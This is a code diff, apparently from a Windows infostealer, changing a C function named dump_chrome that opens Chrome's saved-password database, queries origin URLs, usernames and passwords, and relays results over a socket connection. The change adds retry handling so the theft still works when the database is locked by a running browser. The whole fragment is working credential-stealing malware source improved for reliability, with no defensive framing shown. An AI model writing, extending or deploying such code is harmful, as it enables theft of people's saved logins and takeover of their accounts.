@@ -123,10 +123,6 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 			/* Open database connection */
 			void* handle_db;																		// Handle to SQLite Database handle
 			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
-			
-			/* Clears the appended '\' + Profile Name + '\Login Data' from the chrome_dir_char to append the path for Login Data for the next user */
-			//memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
-			
 			if (!database_con_status) {
 				Debug(send_data(message, ConnectSocket);)
 				continue;
@@ -134,9 +130,22 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 			/* Create a SQL statement to be executed */
 			void* handle_sql_stmt = NULL;															// Handle to SQLite Query Statement
-			if (!prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) {
-				Debug(send_data(message, ConnectSocket);)
-				continue;
+			BOOL sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size);
+			if (sql_status == DATABASE_BUSY) {
+				if (!close_database(handle_db, handle_sql_stmt, message, message_size)) {
+					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Database reset error\n");)
+					Debug(send_data(message, ConnectSocket);)
+					continue;
+				}
+				database_con_status = open_database(logindata_path, &handle_db, message, message_size, TRUE);
+				if (!database_con_status) {
+					Debug(send_data(message, ConnectSocket);)
+					continue;
+				}
+				if ((sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) != 0) {
+					Debug(send_data(message, ConnectSocket);)
+					continue;
+				}
 			}
 
 			/* Ietrate over results one by one */
